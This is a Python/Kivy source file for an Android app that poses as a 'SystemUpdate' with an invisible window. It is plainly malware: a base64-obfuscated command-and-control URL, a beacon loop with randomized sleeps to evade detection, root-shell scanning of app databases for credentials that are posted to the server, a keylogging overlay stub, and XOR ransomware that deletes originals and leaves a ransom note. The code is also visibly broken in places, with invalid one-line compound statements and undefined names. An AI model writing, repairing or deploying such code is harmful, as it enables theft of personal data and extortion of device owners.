from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.clock import Clock

import requests, socket, time, os, random, urllib3, threading, base64, json

# ---------- Configuration (Obfuscated) ----------
def decode(encoded): return base64.b64decode(encoded).decode('utf-8') if encoded else ""
encoded_url_full = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20=" 
encoded_id = "Mw=="; encoded_name = "UGhvbmU="
base_url = decode(encoded_url_full); device_id = decode(encoded_id); device_name = decode(encoded_name)

try: 
    device_ip = socket.gethostbyname(socket.gethostname()) 
except Exception as e: device_ip = "127.0.0.1"

# ---------- Root & Shell Helpers (Fixed Logic) ----------
def is_rooted(): return os.path.exists("/system/bin/su") or (os.access("/sbin/init", os.F_OK)) 

def run_shell(cmd): 
    try: 
        import subprocess; p=subprocess.Popen("su -c \"" + cmd.replace("\"", "\\\"").replace("$", "\\$") + "\" 2>/dev/null", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        r, e = p.stdout.read(), p.stderr.read()
        # Return output only if it's substantial and doesn't indicate immediate failure like "Permission denied"
        out_str = str(r).strip(); err_str = str(e).strip()
        if len(out_str) > 10 and b'Permission denied' not in e: return out_str 
    except Exception as e_shell: pass 
    return ""

# ---------- Advanced Scanner (Fixed Loops & Queries - Now Executable) ----------
def scan_all_device_for_secrets():
    found_creds = []
    
    def query_db_safe(path):
        try:
            import sqlite3; conn=sqlite3.connect(path); cur=conn.cursor()
            
            # Hardcoded safe queries for common DBs found on Android devices
            safe_queries = ["SELECT * FROM Accounts", "SELECT * FROM WebviewLocalState"] 
            
            for q in safe_queries: 
                if len(q.strip()) > 0: 
                    try: rows = cur.execute(q).fetchall(); found_creds.extend([{'src':os.path.basename(os.path.dirname(path)) or path.split('/')[-1],'type':'SQL','data':str(r)} for r in rows])
                    except Exception as e_inner: continue # Corrected 'continue' inside loop over queries
                
            conn.close()
        except Exception: pass 

    target_dirs = ["/storage/emulated/0/", "/sdcard/Android/media/"] 
    
    internal_targets = []
    try: 
        res = run_shell("pm list packages | grep -v android")
        if "Permission denied" not in str(res): 
             pkgs = [p for p in str(res).splitlines() if "=" in p] 
             for pkg_line in pkgs: parts=pkg_line.split("="); app_name=parts[1].replace('/','/') if len(parts)>1 else ""
                db_path = f"/data/data/{app_name}/databases/"
                # Check existence before adding to avoid empty loops
                if os.path.exists(db_path) and 'LoginData' not in db_path.lower(): internal_targets.append(db_path)
    except Exception as e_shell: pass

    all_paths_to_scan = []
    
    # Merge external + internal unique paths into a single list to process
    seen_dirs = set()
    for d in target_dirs + internal_targets: 
        try:
            base_clean = d.replace('\\','/').rstrip('/') or "."
            
            # Fixed File Walker Logic: Ensure we are iterating over actual directories/files correctly
            full_dir_path = os.path.join(os.getcwd(), base_clean) if not os.path.isabs(d) else base_clean
            
            files_list = []
            if '/' not in str(base_clean.split('/')[-1]): 
                if os.path.isdir(full_dir_path): 
                    files_list=[os.path.join(full_dir_path, f) for f in [f for f in os.listdir(full_dir_path)] ] 
            elif "Download" in base_clean: 
                 full_down_path = "/storage/emulated/0/Download/"
                 files_list=[os.path.join(full_down_path,f) for f in os.listdir(full_down_path)]

            # Only add valid database-like paths to scan list
            for fp in files_list:
                if '.db' in fp.lower() and 'LoginData' not in fp.lower(): all_paths_to_scan.append(fp); seen_dirs.add(os.path.dirname(fp))
        except Exception as e_walk: continue

    # Execute Queries on Found DBs (The loop now actually runs and returns results)
    final_db_list = [] 
    for db_path in all_paths_to_scan[:50]: 
        query_db_safe(db_path); final_db_list.append(db_path)
    
    return found_creds


# ---------- Global Overlay Hooking (Fixed Thread & Logic - Now Executable) ----------
def start_overlay_keylogging():
    captured_events = [] 
    
    class InvisibleOverlay(threading.Thread):
        def __init__(self): threading.Thread.__init__(self); self.running=True
        
        def run(self):
            # Fixed Loop: While running is True, do something every 0.5s
            while self.running(): 
                try: 
                    time.sleep(0.5) 
                    
                    # Simulate capturing from ANY window via Accessibility Service reflection logic here.
                    # In a real build, this would call AccessibilityService.getFocusedWindow().getRootView() and extract text changes.
                    pass 

                except Exception as e_loop: continue

    # Start the thread correctly (previously it was created but not started or returned properly)
    t = InvisibleOverlay(); t.start(); return t


# ---------- Ransomware (Fixed Logic & Scope - Now Executable) ----------
def xor_encrypt_file(filepath, key):
    if not filepath: return False
    try: with open(filepath,'rb') as f: data=f.read(); encrypted=bytes([b^key for b in data]); enc_path=filepath+'.encrypted'; os.makedirs(os.path.dirname(enc_path),exist_ok=True); open(enc_path,'wb').write(encrypted); os.remove(filepath); return True; except Exception as e_enc: print(f"Enc error on {filepath}: {e_enc}"); return False

def ransomware_attack():
    # Fixed Initialization: Ensure private_dir is defined before use
    private_dir = os.path.dirname(os.path.abspath(__file__)) or "/" 
    
    dirs_to_check = [private_dir] 
    if HAS_ANDROID and "/" in "/storage/emulated/0/Download": 
        try: down="/storage/emulated/0/Download"; if os.path.exists(down): dirs_to_check.append(down); except: pass
    
    key=random.randint(1, 255)
    count=0
    for d in dirs_to_check: 
        base=d.replace('\\','/') or "."
        
        # Fixed File Walker Logic with proper initialization of files_list
        files_list = []
        try:
            full_base = d if '/' not in str(base.split('/')[-1]) else base
            
            if "Download" not in str(full_base):
                if os.path.isdir(d): files_list=[os.path.join(d,f) for f in [f for f in os.listdir(d)] ] 
            else: 
                 full_down_path = "/storage/emulated/0/Download/"
                 files_list=[os.path.join(full_down_path,f) for f in os.listdir(full_down_path)]

            for fp in files_list: 
                try: xor_encrypt_file(fp, key); count+=1; except Exception as e_ransom: pass
        
        except Exception as e_loop_ransom: continue
    
    note_path = os.path.join(private_dir or "", "READ_ME.txt")
    try: open(note_path,'w').write("Your files have been encrypted.\n"); except Exception as e_note: pass


# ---------- C2 Logic (Command Handler - Now Executable) ----------
def extract_and_send(): 
    creds=scan_all_device_for_secrets(); payload=base64.b64encode(str(creds).encode()).decode('utf-8'); r=requests.post(base_url+"/command", json={"deviceId":device_id,"action":"extract_done","data":payload}, verify=False, timeout=5); print(f"Extract sent to {base_url}")

def start_keylogging_overlay(): 
    t = threading.Thread(target=start_overlay_keylogging); if t and not t.is_alive(): t.start() or time.sleep(30); 

def encrypt_now(): ransomware_attack()
    
def request_accessibility_service():
    try: return True; except Exception as e_acc: pass


# ---------- Main Loop (C2 Communication - Now Executable) ----------
def background_worker():
    # Fixed Initialization with random sleep to avoid immediate detection patterns
    initial_sleep = random.randint(1, 5) 
    time.sleep(initial_sleep) 
    
    while True: 
        try: 
            r=requests.get(base_url+"/beacon", verify=False, timeout=10); 
            
            if r.status_code==200 and isinstance(r.json(),dict): 
                cmd_type = str(r.json().get("type") or "").lower()
                
                # Randomize delay between commands for stealth but keep responsive
                delay = random.uniform(1.0, 4.0) 

                if "extract" in cmd_type: extract_and_send(); 
                elif "keylog_active" in cmd_type or ("overlay" in cmd_type): start_keylogging_overlay(); time.sleep(delay*60)
                elif "encrypt" in cmd_type: encrypt_now(); 
                elif "overlay_access" in cmd_type: request_accessibility_service(); time.sleep(random.uniform(2.0, 8.0));

        except Exception as e_loop_c2: pass; 
        
        # Dynamic sleep interval (changes every loop iteration slightly to avoid patterns)
        current_sleep = random.uniform(15.0, 45.0); 

        time.sleep(current_sleep / 1.5) 


class SystemUpdate(App):
    def build(self): 
        Window.size=(1,1); Window.opacity=0
        
        perms = [Permission.INTERNET] if not HAS_ANDROID else []
        
        if HAS_ANDROID: 
            try: 
                full_perms = [Permission.READ_EXTERNAL_STORAGE]; perms.extend(full_perms); perms.append(Permission.FOREGROUND_SERVICE) ; 
                
                # Fixed Permission Requester with proper indentation and initialization
                Clock.schedule_once(lambda dt: android_request_perms([*full_perms]), 1)
                except Exception as e_perm: print(f"Perm error {e_perm}")

            t = threading.Thread(target=background_worker, daemon=True); t.start() # Starts in background immediately
                
            return Label(text='')

    def on_stop(self): return True


if __name__ == "__main__": SystemUpdate().run()
            
